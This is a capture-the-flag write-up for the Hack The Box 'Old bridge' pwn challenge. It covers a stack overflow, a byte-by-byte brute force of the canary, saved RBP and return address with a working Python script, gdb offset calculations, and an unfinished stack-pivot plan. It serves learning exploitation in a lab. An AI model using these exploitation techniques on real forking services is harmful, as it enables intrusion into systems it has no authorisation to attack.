# Hack The Box - PWN - Old bridge

### Binary Analysis
We get a binary copy of the program that runs on the server so we can run it locally and test it.
In this challenge I use Docker to setup the local server for easy debug and testing.

Like previous challenges, I like to start with a binary examination on program... see what it does and where is the exploit.

Let's take a look at the `main`:
Thanks to Ghidra's decompiler we can get general idea of the `main` function:
```c
/* ...  */
  while( true ) {
    local_50 = 0x10;
    local_40 = accept(server_sd,&local_28,&local_50);
    if (local_40 < 0) {
      perror("accept");
      close(server_sd);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_3c = fork();
    if (local_3c < 0) break;
    if (local_3c == 0) {
      iVar1 = check_username();
      if (iVar1 != 0) {
        write(local_40,"Username found!\n",0x10);
      }
      close(local_40);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    close(local_40);
  }
  perror("fork");
  close(local_40);
  close(server_sd);
                    /* WARNING: Subroutine does not return */
  exit(1);
/* ... */
```

While it may seem confusing at first, the main loop here just `fork`s on each new connection and calls `check_username` on the child process (the parent does not enter that if statement and returns back to listening to more clients connecting).

No vulnerable code so far, as far as I can tell - we didn't even get to the heart of the program yet. Let's dive to `check_username`

```c
ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}

```
After a little bit of cleaning and variable renaming we can see the picture more clearly:

```c

ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}
```

The interesting part here is:

1. The `read` calls fill in a buffer with `0x420 = 1056` bytes **but** the buffer it stores it into is only 1032! Buffer overflow detected! are we done?
2. Every single bit of the input from the user is XORed with `0xdz`, then the start of the string is checked against the "hidden" username: `il{dih`. <br>
To reveal the real username we can XOR that text with `0xd` again. We can use a simple Python one-liner we can figure out what is the username:
```python
>>> "".join([chr(ord(t) ^ 0xd) for t in "il{dih"])
'davide'
```

We have enough information about that binary, now I feel it's time to move to live testing and playing around with it. 

I should note that usually the binary examination is much more complex, and starting with the "playing around" phase is probably the smarter choice for pwn challenges in the future. But hey, I'm here to learn.

### Setting up our test server (using Docker)
Docker is a nice tool we can use to setup a linux environment for the process to run so we can play around with it.
To do that, I've downloaded the demo Ubuntu image, installed gdb,peda and more tools on it, and run the following command:

```$ docker run --rm -it --cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined -v ~/Desktop:/from_host -w /app new_ubuntu```

* `--cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined` is used for allowing the container to run and debug processes, while connecting the 1337 port between the host (our machine) and the container(which will run the server). That way we can access the server directly from our machine as the client
* `-v ~/Desktop:/from_host` Give the container access to the volume specified from the host. So the container may access our `oldbridge` binary

After running it, we can test the program a little bit:
```
/Users/shaked$ nc localhost 1337
Username: gimme root
/Users/shaked$ nc localhost 1337
Username: davide
Username found!
/Users/shaked$ nc localhost 1337
Username: davideasdasdasdasdasdasdasd
Username found!
```

We know that our buffer is 1032 bytes long, what happens when we overflow it?<br>
`$ python -c 'print "A"*1032' | nc localhost 1337` (1032 "A"s plus a newline character = 1033 bytes)

We get nothing back, and if we look at the server:
```
root@04a0530e836b:/from_host/programming2/challenges/hack_the_box/oldbridge# ./oldbridge 1337
*** stack smashing detected ***: <unknown> terminated
```

### Problem #1 - Stack canary 
What had happend? why not SIGSEGV? If we go back to the source code again we can see that there's a use of a stack guard, a stack canary value. A stack canary is a random value that is placed right before the stack frame ends. That is, it is placed above the old frame pointer and the return address.

When the function is done, there's a check between the stack canary and the location which is it was originally stored (which we cannot override) and if there's a mismatch - the program knows someone has messed up the stack and exit *un-gracefully*;
```c
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```

### Problem #2 - Position Independent Executable (PIE) 
Usually when you compile a simple program, the compiler can assume the regular address space for the program headers (.text section, .bss, .data, etc...) and during runtime the system would not randomize that part (as we saw in ROPme).

But - when you compile a library, you compile it as PIE, so the code inside it may be loaded into any address in the future. 

You can, if you like - compile a program with the `-fPIE` flag and it would still run perfectly. And it would have effectively randomize the code section of our binary during runtime. This makes things hard for us in finding gadgets to use, because everytime the program loads, a new address is issued for all of the variables! **But** let us not forget that the randomization is **page based*, and only the base of the section is randomized.

So if we would know the base which the .text section was loaded into, we can figure out where the rest of the symbols are by looking at the binary given to us.

### Problem #3 - ASLR 
Same as ROPme, makes it hard for us to find gadgets, not just in the .text section - but also from libc or the stack

### Problem #4 - Libc version
Even if we would defeat ASLR, we still need to know the offsets of gadgets for us to use.

### One solution for all
In the `main()`, before any client is being processed, the process is `fork`ed. 

`fork()` is copying the entire process memory to a child except for 1 register, the `rax`. This is so that the child would be able to tell that it was forked. 

**This is GREAT for us because this means that every child created, and the parent as well, will share the same libc base, .text section base, the stack canary and even the stack base!**

So what do we do? first we have to leak the canary, because it is the first value that is being overriden after the buffer overflows.

Our strategy would be to try and override a *single* byte from the canary, one at a time - and if we get a valid repsponse from the server( "Username found!") we can learn that the system thinks the canary is intact and we effectively learned a byte from the canary!

We can now start writing our exploit:
```python
import socket

SERVER = ("localhost", 1337)

def send_payload(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)
    s.send(p)

    res = False
    try:
        line = s.recv(4096)
        res = "Username found!" in line

    finally:
        s.close()

    return res

def leak_next_byte(prefix):
    for test_byte in [chr(t) for t in range(256)]:
        if send_payload(prefix + test_byte):
            print "Found:", hex(ord(test_byte))
            return prefix + test_byte


def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    leak_next_byte(payload)

if __name__ == "__main__":
    main()
```

We have a small function that sends a payload and reports if the payload is good (by checking if the server returned the "Username found!" message). If the server fails - no message will be sent back and we would know that we have broken the stack canary.<br>
We use `leak_next_byte` to leak the next 8 bytes from the stack:

```python
def leak_canary(prefix):
    payload = prefix
    for i in range(8):
        payload = leak_next_byte(payload)
    return payload[-8:]
```

```
$ python exploit.py 
Found: 0xd
Found: 0xcc
Found: 0x75
Found: 0xf0
Found: 0x95
Found: 0xff
Found: 0x6c
Found: 0xcb
Canary:
0xcb6cff95f075cc0dL
```

Note: the canary we display is the canary after XORed with `0xd`. This is because our byte that we test are XORed and then placed to the canary.

### What's past the canary?
After the canary there's the old frame pointer. Which usually we find it insignificant because we want to go straight ahead to override the return address which located right after it.

But in here, we do not have enough stack space for a long ROP chain like in ROPme, we can override the buffer (1032 bytes), the canary (1040), the old rbp (1048) and the return address (1056) and *that's it*.

Before we think about how to jump around in the program, let's use the previous technique to leak the old RBP on the stack as well as the return address.<br>
We can do that because if we want to receive "Username found!" from the server, the `main()` function would need the right stack pointer set to load values from the stack to those `write` calls. if we mess it up even a little bit, we can notice it in our client side by not receiving the message.

**Leaking the return address is a little bit more difficult**. Because we start by overriding the least significant byte, the program might return to some other location in the `main`, it could be another `fork` or `accept` and make things be a little less predictible for us. <br>
But - since the randomization is only effective for the least 12 bits of the return address, the first byte will definitely not change:

The return address from `check_username` is:
```
   0x0000555555554eca <+561>:	call   0x555555554b6f <check_username>
   0x0000555555554ecf <+566>:	test   eax,eax
```

So it would always end with `0xcf`!

```python
def leak_n_bytes(prefix, n):
    payload = prefix
    for i in range(n):
        payload = leak_next_byte(payload)
    return payload[-n:]

def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    print "Leaking canary"
    canary = leak_n_bytes(payload, 8)
    print "Leaking old RBP"
    old_rbp = leak_n_bytes(payload + canary, 8)
    print "Leaking return address"
    ret_addr = leak_n_bytes(payload + canary + old_rbp + chr(ord("\xcf") ^ 0xd), 7)
```

```
$ python exploit.py 
Leaking canary
Found: 0xd
Found: 0xc0
Found: 0x2a
Found: 0xf7
Found: 0x4c
Found: 0xf6
Found: 0x34
Found: 0x5d
Leaking old RBP
Found: 0x5d
Found: 0xf6
Found: 0x2b
Found: 0xad
Found: 0xf2
Found: 0x72
Found: 0xd
Found: 0xd
Leaking return address
Found: 0x13
Found: 0xe9
Found: 0x6e
Found: 0xad
Found: 0x58
Found: 0xd
Found: 0xd
Found: 0x0
```

What we have so far:

1. Using the return address we can now learn the **start of the .text section**. We can use gadgets from there, as well as jumping to the @plt of functions there and probably use the Global Offset Table for libc functions to leak libc addresses

2. Using the RBP, we can learn **the address of our buffer on the stack** because the offset from the old rbp and our stack will be fixed regardless of the starting address of the stack section in memory.

Let's start by computing the address of our buffer on the stack. By looking at the server, when the server `read`s our input to `0x7fffffffe110`:
```
=> 0x555555554bc9 <check_username+90>:	call   0x555555554970 <read@plt>
   0x555555554bce <check_username+95>:	mov    DWORD PTR [rbp-0x414],eax
   0x555555554bd4 <check_username+101>:	mov    DWORD PTR [rbp-0x418],0x0
   0x555555554bde <check_username+111>:	jmp    0x555555554c0b <check_username+156>
   0x555555554be0 <check_username+113>:	mov    eax,DWORD PTR [rbp-0x418]
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0x7fffffffe110 --> 0x7ffff7ffe4c8 --> 0x7ffff7ffe428 --> 0x7ffff7ff1510 --> 0x7ffff7ffe170 --> 0x555555554000 (--> ...)
arg[2]: 0x420 
```

And if we check out the old rbp value (at the bottom of the stack frame), we can check that value by looking at where our current `rbp` is pointing to `0x00007fffffffe590`:

```
gdb-peda$ x/4gx $rbp
0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
gdb-peda$ x/16gx $rbp-0x20
0x7fffffffe500:	0x4242424242424242	0x4242424242424242
0x7fffffffe510:	0x4242424242424242	0xc68342c2b57a9500
0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
0x7fffffffe540:	0x00007fffffffe5a8	0x0000000100000010
0x7fffffffe550:	0x0000001000000539	0x0000000000000004
0x7fffffffe560:	0x0000000039050002	0x0000000000000000
0x7fffffffe570:	0x010011ac589b0002	0x0000000000000000
```

The distance from old rbp `0x00007fffffffe590` to our buffer `0x7fffffffe110` is `0x480`.

Moving on to the .text section, we leaked a specific address of an instruction inside the `main` function (the one that ends with `0xcf`).<br>
We can again go back to our server to see the offset of that value from the start of the section

```
gdb-peda$ bt
#0  0x0000555555554bce in check_username ()
#1  0x0000555555554ecf in main ()
#2  0x00007ffff7a05b97 in __libc_start_main (main=0x555555554c99 <main>, argc=0x2, argv=0x7fffffffe678, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffe668) at ../csu/libc-start.c:310
#3  0x0000555555554a5a in _start ()
gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
So the distance between the return address `0x0000555555554bce` and the start of the section `0x0000555555554000` is exactly `0xbce` bytes.

We now have the code section start, as well as the start of our buffer on the stack. The next step that I usually take is to go towards a libc leak and figure out the libc version, but here's where our big problem lies: **we have not space for a ROP chain!** as we cannot override past the return address, what do we do?

### Stack pivoting, create your own stack
Stack pivoting is a fancy name for replacing the program's `rsp` with a pointer to some area in the memory which you control, how does that help us?

Well, since the end of the `check_username` function is a `ret` instruction, what if we could control the stack pointer to point to somewhere inside our buffer? we would be able to control that `ret`!

To do so we need to change the `rsp`, and we have only 1 jump that we can control in order to get it.

### The LEAVE instruction
The [leave](https://c9x.me/x86/html/file_module_x86_id_154.html) instruction which is present at the end of the function restores the old stack pointer of the previous frame. The instruction is "leaving" the current frame.<br>
To do so first: it perform `rsp = rbp`. Restoring the `rsp` to the value from the previous frame.<br>
I like to think of `leave` as the "`ret`" instruction of the stack.

Great, so if we `ret` to the `leave` instruction again (1 instruction above the original `ret`), we are basically "popping" the rbp again effectively changing the `rsp` to the value of our choosing!<br>
All that is required of us is to change the return address to the `leave` instruction. After which the program will execute the `leave` and then the `ret`. The `ret` now will return to a value at the stop of the stack, which **is the custom stack now**